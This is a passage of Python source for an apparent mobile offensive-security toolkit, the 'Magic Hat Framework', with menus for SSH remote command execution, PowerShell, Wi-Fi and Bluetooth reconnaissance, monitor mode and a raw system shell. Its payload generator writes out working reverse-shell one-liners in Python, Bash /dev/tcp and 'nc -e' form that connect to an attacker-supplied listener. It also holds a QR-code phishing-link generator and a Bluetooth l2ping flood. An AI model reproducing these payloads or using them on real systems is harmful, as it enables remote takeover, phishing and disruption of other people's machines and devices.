        print(f"{Colors.RED}\n[-] Subnet sweep failed: {e}{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return to main menu...{Colors.ENDC}")
            
def handle_view_logs():
    """Display past scan logs stored in the database and view full output."""
    while True:
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print("=== SCAN ARCHIVES (LOGS) ===".center(60))
        print("-" * 60)
        
        logs = get_scan_logs()
        if not logs:
            print(f"{Colors.YELLOW}No scan logs found in the archives yet.{Colors.ENDC}")
            input(f"{Colors.YELLOW}\nPress Enter to return to the main menu...{Colors.ENDC}")
            break
            
        print(f"{'ID':<4} | {'Tool':<16} | {'Target':<15} | {'Timestamp'}")
        print("=" * 60)
        for log in logs:
            print(f"{log['id']:<4} | {log['tool_name']:<16} | {log['target']:<15} | {log['timestamp']}")
            
        print("-" * 60)
        view_id = input(f"{Colors.YELLOW}Enter log ID to view full output (or press Enter to go back): {Colors.ENDC}").strip()
        if not view_id:
            break
            
        if view_id.isdigit():
            with get_connection() as conn:
                row = conn.execute("SELECT tool_name, target, timestamp, output FROM scan_logs WHERE id = ?", (view_id,)).fetchone()
                if row:
                    clear_screen()
                    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
                    print(f"=== LOG DETAILS [ID: {view_id}] ===".center(60))
                    print(f"Tool:   {row['tool_name']}")
                    print(f"Target: {row['target']}")
                    print(f"Time:   {row['timestamp']}")
                    print("-" * 60)
                    print(row['output'])
                    print("-" * 60)
                else:
                    print(f"{Colors.RED}\n[-] Error: Log ID not found.{Colors.ENDC}")
            input(f"{Colors.YELLOW}\nPress Enter to continue...{Colors.ENDC}")
        else:
            print(f"{Colors.RED}\n[-] Invalid input. Please enter a numeric ID.{Colors.ENDC}")
            input(f"{Colors.YELLOW}\nPress Enter to continue...{Colors.ENDC}")

def handle_ssh_audit():
    """Tool: SSH Remote Execution & Banner/Key Auditor."""
    print_target_context("=== PAGE: SSH AUDITOR & REMOTE ACCESS ===")
    
    use_intel = input(f"{Colors.YELLOW}Select target from intelligence database? [Y/N]: {Colors.ENDC}").strip().lower()
    target = None
    if use_intel in ['y', 'yes']:
        target = select_target_interactive()
        
    if not target:
        target = input(f"{Colors.YELLOW}Enter target IP/hostname (or 'b' to back): {Colors.ENDC}").strip()
        if target.lower() in ["b", "99", "back", ""]:
            return
            
    print(f"{Colors.GREEN}[*] Target Locked: {target}{Colors.ENDC}")
    port = input(f"{Colors.YELLOW}Enter SSH port [default 22]: {Colors.ENDC}").strip() or "22"
    user = input(f"{Colors.YELLOW}Enter SSH username [default root]: {Colors.ENDC}").strip() or "root"
    
    print("\nSelect Action:")
    print(f"{Colors.BOLD}1.{Colors.ENDC} Audit Banner & Key Exchange Algorithms (ssh-keyscan)")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Test Remote SSH Interactive Connection")
    print(f"{Colors.BOLD}3.{Colors.ENDC} Execute Single Remote Command")
    
    choice = input(f"{Colors.YELLOW}Select action [1-3]: {Colors.ENDC}").strip()
    
    if choice == "1":
        print(f"{Colors.GREEN}\n[+] Querying SSH key signatures for {target}:{port}...{Colors.ENDC}")
        try:
            cmd = ["ssh-keyscan", "-p", port, target]
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            output = res.stdout if res.stdout else res.stderr
            
            clear_screen()
            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
            print(f"=== SSH KEYSCAN TELEMETRY: {target} ===".center(60))
            print(output)
            
            log_scan("SSH Keyscan", f"{target}:{port}", output)
            print(f"{Colors.GREEN}\n[✔] SSH key telemetry logged to database.{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}\n[-] SSH keyscan failed: {e}{Colors.ENDC}")
            
    elif choice == "2":
        print(f"{Colors.GREEN}\n[+] Spawning interactive SSH session to {user}@{target}:{port}...{Colors.ENDC}")
        try:
            subprocess.run(["ssh", "-p", port, f"{user}@{target}"])
        except Exception as e:
            print(f"{Colors.RED}\n[-] Interactive SSH failed: {e}{Colors.ENDC}")
            
    elif choice == "3":
        remote_cmd = input(f"{Colors.YELLOW}Enter remote command to execute: {Colors.ENDC}").strip()
        if remote_cmd:
            print(f"{Colors.GREEN}\n[+] Executing '{remote_cmd}' on {target}...{Colors.ENDC}")
            try:
                cmd = ["ssh", "-p", port, f"{user}@{target}", remote_cmd]
                res = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                output = res.stdout
                print(output)
                log_scan("SSH Remote Exec", f"{user}@{target}", output)
            except Exception as e:
                print(f"{Colors.RED}\n[-] Remote command failed: {e}{Colors.ENDC}")
                
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_powershell_audit():
    """Tool: PowerShell Core (pwsh) & WinRM Remote Management."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== PAGE: POWERSHELL CORE & WINRM ===".center(60))
    print("-" * 60)
    
    if not shutil.which("pwsh"):
        print(f"{Colors.RED}\n[-] Notice: 'pwsh' (PowerShell Core) binary is not installed in this environment.{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] To install in Termux: `pkg install powershell` (if available for your arch).{Colors.ENDC}")
        input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
        return

    print("Select Mode:")
    print(f"{Colors.BOLD}1.{Colors.ENDC} Run Local PowerShell Command / One-Liner (pwsh -c)")
    print(f"{Colors.BOLD}2.{Colors.ENDC} WinRM Remote Query (WS-Man / Windows Hosts)")
    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    if choice == "1":
        ps_cmd = input(f"{Colors.YELLOW}Enter PowerShell command: {Colors.ENDC}").strip()
        if not ps_cmd:
            return
        try:
            cmd = ["pwsh", "-NoProfile", "-NonInteractive", "-Command", ps_cmd]
            res = subprocess.run(cmd, capture_output=True, text=True, check=True)
            clear_screen()
            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
            print("=== POWERSHELL EXECUTION OUTPUT ===".center(60))
            print(res.stdout)
            log_scan("PowerShell Command", "Local Host", res.stdout)
        except Exception as e:
            print(f"{Colors.RED}\n[-] PowerShell execution failed: {e}{Colors.ENDC}")
            
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_wireless_recon():
    """Tool: Wireless & RF Footprinting with fallback interface checks."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== PAGE: WIRELESS & RF FOOTPRINTING ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} List Wireless Interfaces & Status (iw / nmcli / ip link)")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Scan Nearby Wi-Fi Networks")
    print(f"{Colors.RED}99. Back to Suite Menu (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    output = ""
    if choice == "1":
        print(f"{Colors.GREEN}\n[+] Querying wireless subsystem...{Colors.ENDC}")
        try:
            if shutil.which("iw"):
                res = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=True)
                output = res.stdout
            elif shutil.which("nmcli"):
                res = subprocess.run(["nmcli", "device", "wifi"], capture_output=True, text=True, check=True)
                output = res.stdout
            elif shutil.which("ip"):
                res = subprocess.run(["ip", "link"], capture_output=True, text=True, check=True)
                output = "[*] 'iw' and 'nmcli' not found in sandbox. Fallback to system network links:\n" + res.stdout
            else:
                output = "[-] No wireless control binaries (iw, nmcli) or ip tools found in environment."
        except Exception as e:
            output = f"[-] Wireless query failed: {e}"
            
    elif choice == "2":
        print(f"{Colors.GREEN}\n[+] Scanning nearby Wi-Fi networks...{Colors.ENDC}")
        try:
            if shutil.which("nmcli"):
                res = subprocess.run(["nmcli", "device", "wifi", "list"], capture_output=True, text=True, check=True)
                output = res.stdout
            else:
                output = "[-] Wi-Fi scanner ('nmcli') requires NetworkManager daemon, which is restricted in Termux without root/proot."
        except Exception as e:
            output = f"[-] Wi-Fi scan failed: {e}"
            
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== WIRELESS / RF TELEMETRY ===".center(60))
    print(output)
    log_scan("Wireless Recon", "Airspace", output)
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_monitor_mode():
    """Hardware Tool: Toggle wireless interface monitor mode via airmon-ng or iwconfig."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== WIRELESS MONITOR MODE MANAGER ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} Check Wireless Interfaces (airmon-ng / iwconfig)")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Enable Monitor Mode on Interface (e.g., wlan0)")
    print(f"{Colors.BOLD}3.{Colors.ENDC} Disable Monitor Mode")
    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-3, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
    elif choice == "1":
        try:
            res = subprocess.run(["airmon-ng"], capture_output=True, text=True, check=True)
            print(res.stdout)
        except Exception:
            try:
                res = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
                print(res.stdout)
            except Exception as e:
                print(f"{Colors.RED}[-] Wireless query failed: {e}{Colors.ENDC}")
    elif choice == "2":
        iface = input(f"{Colors.YELLOW}Enter interface name to put into monitor mode (e.g., wlan0): {Colors.ENDC}").strip()
        if iface:
            try:
                subprocess.run(["airmon-ng", "start", iface], check=True)
                print(f"{Colors.GREEN}\n[✔] Monitor mode enabled.{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.RED}[-] Failed to start monitor mode: {e}{Colors.ENDC}")
    elif choice == "3":
        iface = input(f"{Colors.YELLOW}Enter monitor interface name to stop (e.g., wlan0mon): {Colors.ENDC}").strip()
        if iface:
            try:
                subprocess.run(["airmon-ng", "stop", iface], check=True)
                print(f"{Colors.GREEN}\n[✔] Monitor mode stopped.{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.RED}[-] Failed to stop monitor mode: {e}{Colors.ENDC}")
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_wordlist_manager():
    """Integrated Wordlist Manager: Verify and sync standard wordlists."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== INTEGRATED WORDLIST MANAGER ===".center(60))
    print("-" * 60)
    wordlist_path = "/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt"
    print(f"[*] Default Wordlist Path: {wordlist_path}")
    
    exists = os.path.exists(wordlist_path)
    status_str = f"{Colors.GREEN}FOUND [✔]{Colors.ENDC}" if exists else f"{Colors.RED}MISSING [✘]{Colors.ENDC}"
    print(f"[*] Status: {status_str}")
    
    if not exists:
        print(f"{Colors.GREEN}\n[+] Creating standard fallback wordlist directory & file...{Colors.ENDC}")
        try:
            os.makedirs(os.path.dirname(wordlist_path), exist_ok=True)
            sample_words = ["admin", "login", "dashboard", "api", "config.json", "secret", "backup", "test", "uploads", "wp-admin", "server-status"]
            with open(wordlist_path, "w") as wf:
                wf.write("\n".join(sample_words) + "\n")
            print(f"{Colors.GREEN}[✔] Fallback common wordlist created successfully!{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[-] Failed to create wordlist: {e}{Colors.ENDC}")
    else:
        print(f"{Colors.GREEN}[✔] Wordlist is verified and ready for FFUF and audit tools.{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_bluetooth_recon():
    """Tool: Bluetooth & BLE Airspace Mapping."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== BLUETOOTH & BLE AIRSPACE RECON ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} Scan Classic Bluetooth Devices (hcitool scan)")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Scan BLE Devices (bluetoothctl scan le)")
    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    if choice == "1":
        print(f"{Colors.GREEN}\n[+] Scanning for classic Bluetooth devices...{Colors.ENDC}")
        try:
            res = subprocess.run(["hcitool", "scan"], capture_output=True, text=True, timeout=15)
            output = res.stdout if res.stdout else res.stderr
            clear_screen()
            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
            print("=== CLASSIC BLUETOOTH SCAN RESULTS ===".center(60))
            print(output)
            log_scan("Bluetooth Scan", "Airspace", output)
        except Exception as e:
            print(f"{Colors.RED}[-] Bluetooth scan failed (ensure HCI interface is up): {e}{Colors.ENDC}")
            
    elif choice == "2":
        print(f"{Colors.GREEN}\n[+] Scanning BLE beacons and devices (10s timeout)...{Colors.ENDC}")
        try:
            res = subprocess.run(["bluetoothctl", "scan", "le"], capture_output=True, text=True, timeout=10)
            output = res.stdout
            clear_screen()
            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
            print("=== BLE SCAN RESULTS ===".center(60))
            print(output)
            log_scan("BLE Scan", "Airspace", output)
        except Exception as e:
            print(f"{Colors.RED}[-] BLE scan failed: {e}{Colors.ENDC}")
            
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_payload_generator():
    """Tool: Tactical Reverse Shell & Payload Generator."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== PAGE: TACTICAL REVERSE SHELL ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} Python3 Socket Reverse Shell")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Bash TCP Reverse Shell One-Liner")
    print(f"{Colors.BOLD}3.{Colors.ENDC} Netcat Traditional / OpenBSD Listener Command")
    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-3, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    lhost = input(f"{Colors.YELLOW}Enter LHOST (Listener IP): {Colors.ENDC}").strip()
    lport = input(f"{Colors.YELLOW}Enter LPORT (Listener Port): {Colors.ENDC}").strip()
    
    if not lhost or not lport:
        print(f"{Colors.RED}[-] LHOST and LPORT are required.{Colors.ENDC}")
        input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
        return
        
    payload = ""
    if choice == "1":
        payload = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
    elif choice == "2":
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif choice == "3":
        payload = f"nc -e /bin/sh {lhost} {lport}"
        
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print("=== GENERATED PAYLOAD STUB ===".center(60))
    print(f"\n{payload}\n")
    print("-" * 60)
    log_scan("Payload Generator", f"LHOST:{lhost} LPORT:{lport}", payload)
    
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_qr_exploit():
    """Tool: QR Code Payload / Phishing Vector Generator."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== PAGE: QR CODE PAYLOAD GENERATOR ===".center(60))
    print("-" * 60)
    target_url = input(f"{Colors.YELLOW}Enter payload URL or malicious redirection target: {Colors.ENDC}").strip()
    if not target_url:
        return
        
    try:
        qr = qrcode.QRCode(version=1, box_size=1, border=1)
        qr.add_data(target_url)
        qr.make(fit=True)
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print(f"=== ASCII QR CODE PAYLOAD ===".center(60))
        qr.print_ascii(tty=True)
        print("-" * 60)
        log_scan("QR Code Generator", target_url, "Generated ASCII QR payload")
    except Exception as e:
        print(f"{Colors.RED}[-] Failed to generate QR code: {e}{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_bluetooth_attacks():
    """Tool: Advanced Bluetooth Enumeration & L2CAP Stress Testing."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== PAGE: BLUETOOTH ATTACK SUITE ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} Scan & Enumerate Device SDP Services (sdptool)")
    print(f"{Colors.BOLD}2.{Colors.ENDC} L2CAP Ping Flood / Stress Test (l2ping)")
    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    target_mac = input(f"{Colors.YELLOW}Enter Target Bluetooth MAC Address (e.g., 00:11:22:33:44:55): {Colors.ENDC}").strip()
    if not target_mac:
        return
        
    if choice == "1":
        print(f"{Colors.GREEN}\n[+] Querying SDP records for {target_mac}...{Colors.ENDC}")
        try:
            res = subprocess.run(["sdptool", "browse", target_mac], capture_output=True, text=True, timeout=15)
            output = res.stdout if res.stdout else res.stderr
            clear_screen()
            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
            print("=== SDP BROWSE RESULTS ===".center(60))
            print(output)
            log_scan("Bluetooth SDP Browse", target_mac, output)
        except Exception as e:
            print(f"{Colors.RED}[-] SDP browse failed: {e}{Colors.ENDC}")
            
    elif choice == "2":
        count = input(f"{Colors.YELLOW}Enter packet count (default 500): {Colors.ENDC}").strip() or "500"
        print(f"{Colors.GREEN}\n[+] Executing l2ping stress test against {target_mac} ({count} packets)...{Colors.ENDC}")
        try:
            res = subprocess.run(["l2ping", "-i", "hci0", "-s", "600", "-c", count, target_mac], capture_output=True, text=True, timeout=20)
            output = res.stdout
            clear_screen()
            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
            print("=== L2PING STRESS TEST RESULTS ===".center(60))
            print(output)
            log_scan("Bluetooth l2ping", target_mac, output)
        except Exception as e:
            print(f"{Colors.RED}[-] l2ping attack failed: {e}{Colors.ENDC}")
            
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_crypto_engine():
    """Tool: Cryptographic Encryption and Decryption Engine."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== PAGE: CRYPTO & OBFUSCATION ENGINE ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} Base64 Encode / Decode")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Simple XOR Transformation")
    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    if choice == "1":
        mode = input(f"{Colors.YELLOW}Choose mode - [e]ncode or [d]ecode: {Colors.ENDC}").strip().lower()
        text = input(f"{Colors.YELLOW}Enter text input: {Colors.ENDC}")
        try:
            if mode.startswith('e'):
                res = base64.b64encode(text.encode('utf-8')).decode('utf-8')
                print(f"{Colors.GREEN}\n[+] Encoded (Base64):\n{res}{Colors.ENDC}")
                log_scan("Crypto Engine", "Base64 Encode", res)
            else:
                res = base64.b64decode(text.encode('utf-8')).decode('utf-8')
                print(f"{Colors.GREEN}\n[+] Decoded (Base64):\n{res}{Colors.ENDC}")
                log_scan("Crypto Engine", "Base64 Decode", res)
        except Exception as e:
            print(f"{Colors.RED}\n[-] Crypto operation failed: {e}{Colors.ENDC}")
            
    elif choice == "2":
        text = input(f"{Colors.YELLOW}Enter text: {Colors.ENDC}")
        key = input(f"{Colors.YELLOW}Enter single character key: {Colors.ENDC}")
        if not key:
            return
        k = key[0]
        output = "".join(chr(ord(c) ^ ord(k)) for c in text)
        b64_out = base64.b64encode(output.encode('utf-8')).decode('utf-8')
        print(f"{Colors.GREEN}\n[+] XOR Output (Base64 string): {b64_out}{Colors.ENDC}")
        log_scan("Crypto Engine", "XOR Cipher", b64_out)
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
    
def handle_global_target_manager():
    """Phase 6: Global Target Scope Manager."""
    while True:
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print_tactical_header()
        print("=== GLOBAL TARGET SCOPE MANAGER ===".center(60))
        print("-" * 60)
        current = ACTIVE_SCOPE.get("target")
        print(f"[*] Currently Locked Target: {Colors.CYAN}{current if current else 'None'}{Colors.ENDC}")
        print("-" * 60)
        print(f"{Colors.BOLD}1.{Colors.ENDC} Set Global Target Manually")
        print(f"{Colors.BOLD}2.{Colors.ENDC} Select Target from Database Intelligence")
        print(f"{Colors.BOLD}3.{Colors.ENDC} Clear / Reset Global Target Scope")
        print(f"{Colors.RED}99. Back to Main Menu (b){Colors.ENDC}")
        print("-" * 60)
        
        choice = input(f"{Colors.YELLOW}Select option [1-3, or 99/b]: {Colors.ENDC}").strip().lower()
        if choice in ["99", "b", "back"]:
            break
        elif choice == "1":
            new_t = input(f"{Colors.YELLOW}Enter target IP or hostname: {Colors.ENDC}").strip()
            if new_t:
                ACTIVE_SCOPE["target"] = new_t
                print(f"{Colors.GREEN}[✔] Global target locked to: {new_t}{Colors.ENDC}")
                input(f"{Colors.YELLOW}Press Enter to continue...{Colors.ENDC}")
        elif choice == "2":
            selected = select_target_interactive()
            if selected:
                ACTIVE_SCOPE["target"] = selected
                print(f"{Colors.GREEN}[✔] Global target locked to: {selected}{Colors.ENDC}")
                input(f"{Colors.YELLOW}Press Enter to continue...{Colors.ENDC}")
        elif choice == "3":
            ACTIVE_SCOPE["target"] = None
            print(f"{Colors.YELLOW}[*] Global target scope cleared.{Colors.ENDC}")
            input(f"{Colors.YELLOW}Press Enter to continue...{Colors.ENDC}")

def handle_binary_diagnostics():
    """Phase 7: Tactical Binary Health & Dependency Diagnostics."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== BINARY HEALTH & DEPENDENCY DIAGNOSTICS ===".center(60))
    print("-" * 60)
    
    binaries = [
        "nmap", "tshark", "ffuf", "dig", "whatweb", 
        "hydra", "hashcat", "searchsploit", "pwsh", 
        "airmon-ng", "bluetoothctl", "sdptool", "l2ping"
    ]
    
    print(f"{'BINARY / TOOL':<18} | {'STATUS':<12} | {'PATH / NOTES'}")
    print("-" * 60)
    for b in binaries:
        path = shutil.which(b)
        if path:
            status = f"{Colors.GREEN}OPERATIONAL{Colors.ENDC}"
            note = path
        else:
            status = f"{Colors.RED}MISSING [✘]{Colors.ENDC}"
            note = "Run `pkg install ...`"
        print(f"{b:<18} | {status:<20} | {note}")
        
    print("-" * 60)
    input(f"{Colors.YELLOW}Press Enter to return to main menu...{Colors.ENDC}")

def handle_webhook_config():
    """Phase 8: Webhook & Notification Hub."""
    while True:
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print_tactical_header()
        print("=== WEBHOOK & NOTIFICATION HUB ===".center(60))
        print("-" * 60)
        curr_url = WEBHOOK_CONFIG.get("url", "")
        print(f"[*] Current Webhook URL: {Colors.CYAN}{curr_url if curr_url else 'Not Configured'}{Colors.ENDC}")
        print("-" * 60)
        print(f"{Colors.BOLD}1.{Colors.ENDC} Set / Update Webhook URL (Discord / Telegram)")
        print(f"{Colors.BOLD}2.{Colors.ENDC} Send Test Notification")
        print(f"{Colors.BOLD}3.{Colors.ENDC} Disable / Clear Webhook")
        print(f"{Colors.RED}99. Back to Main Menu (b){Colors.ENDC}")
        print("-" * 60)
        
        choice = input(f"{Colors.YELLOW}Select option [1-3, or 99/b]: {Colors.ENDC}").strip().lower()
        if choice in ["99", "b", "back"]:
            break
        elif choice == "1":
            u = input(f"{Colors.YELLOW}Enter Webhook URL: {Colors.ENDC}").strip()
            if u:
                WEBHOOK_CONFIG["url"] = u
                print(f"{Colors.GREEN}[✔] Webhook URL configured successfully.{Colors.ENDC}")
                input(f"{Colors.YELLOW}Press Enter...{Colors.ENDC}")
        elif choice == "2":
            print(f"{Colors.GREEN}[+] Dispatching test notification...{Colors.ENDC}")
            send_notification("Test dispatch from Magic Hat Framework.")
            print(f"{Colors.GREEN}[✔] Test alert sent.{Colors.ENDC}")
            input(f"{Colors.YELLOW}Press Enter...{Colors.ENDC}")
        elif choice == "3":
            WEBHOOK_CONFIG["url"] = ""
            print(f"{Colors.YELLOW}[*] Webhook notifications disabled.{Colors.ENDC}")
            input(f"{Colors.YELLOW}Press Enter...{Colors.ENDC}")

def handle_quick_shell():
    """Phase 9: Operator Quick-Shell Launcher."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== OPERATOR QUICK-SHELL ===".center(60))
    print("Type any command to execute in the system shell.")
    print("Type 'exit' or 'back' to return to the framework menu.")
    print("-" * 60)
    
    while True:
        cmd = input(f"{Colors.GREEN}magic-hat-shell# {Colors.ENDC}").strip()
        if not cmd:
            continue
        if cmd.lower() in ["exit", "back", "99"]:
            break
            
        try:
            subprocess.run(cmd, shell=True)
        except Exception as e:
            print(f"{Colors.RED}[-] Execution error: {e}{Colors.ENDC}")
        print()